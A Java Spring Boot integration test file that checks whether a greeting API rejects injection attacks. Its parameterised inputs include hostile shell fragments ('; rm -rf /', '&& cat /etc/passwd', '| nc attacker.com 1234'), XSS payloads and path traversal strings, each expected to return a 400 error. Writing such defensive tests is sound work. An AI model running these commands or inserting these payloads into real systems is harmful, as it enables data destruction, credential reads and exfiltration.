package com.sap.gtlc.security.security;

import com.sap.gtlc.security.config.TestSecurityConfig;
import com.sap.gtlc.security.model.GreetingRequest;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.context.annotation.Import;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.ActiveProfiles;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@ActiveProfiles("test")
@Import(TestSecurityConfig.class)
class SecurityIntegrationTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @ParameterizedTest
    @ValueSource(strings = {
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 1234",
        "`whoami`",
        "$(command)",
        "hello & background",
        "hello < input",
        "hello > output"
    })
    void shouldRejectCommandInjectionAttempts(String maliciousInput) {
        // Arrange
        GreetingRequest request = new GreetingRequest(maliciousInput);

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        String body = response.getBody();
        assertTrue(body.contains("security-error") || body.contains("validation-error"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>"
    })
    void shouldRejectScriptInjectionAttempts(String maliciousInput) {
        // Arrange
        GreetingRequest request = new GreetingRequest(maliciousInput);

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
    }

    @Test
    void shouldStripControlCharacters() {
        // Arrange
        GreetingRequest request = new GreetingRequest("hello world\r\n");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        // Should either succeed (after stripping) or fail validation
        assertTrue(response.getStatusCode().is2xxSuccessful() ||
                   response.getStatusCode().is4xxClientError());
    }

    @Test
    void shouldTreatInputAsPlainText() {
        // Arrange - message that could be interpreted as template
        GreetingRequest request = new GreetingRequest("2 plus 2");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert - should return exactly as received, not evaluated
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertTrue(response.getBody().contains("2 plus 2"));
    }

    @Test
    void shouldNotExecuteCommands() {
        // Arrange - various command execution patterns
        String[] patterns = {
            "test",  // Safe baseline
            "hello-world",  // Hyphens allowed
            "don't worry"  // Apostrophes allowed
        };

        for (String pattern : patterns) {
            GreetingRequest request = new GreetingRequest(pattern);

            // Act
            ResponseEntity<String> response = restTemplate.postForEntity(
                "/api/v1/greetings",
                request,
                String.class
            );

            // Assert - all should succeed
            assertEquals(HttpStatus.OK, response.getStatusCode());
        }
    }

    @Test
    void shouldHandleSafeSpecialCharacters() {
        // Arrange
        GreetingRequest request = new GreetingRequest("Hello, world! How's it?");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertTrue(response.getBody().contains("Hello, world! How's it?"));
    }

    @Test
    void shouldRejectPathTraversalAttempts() {
        // Arrange
        String[] pathTraversalPatterns = {
            "../etc/passwd",
            "..\\windows\\system32"
        };

        for (String pattern : pathTraversalPatterns) {
            GreetingRequest request = new GreetingRequest(pattern);

            // Act
            ResponseEntity<String> response = restTemplate.postForEntity(
                "/api/v1/greetings",
                request,
                String.class
            );

            // Assert
            assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        }
    }
}
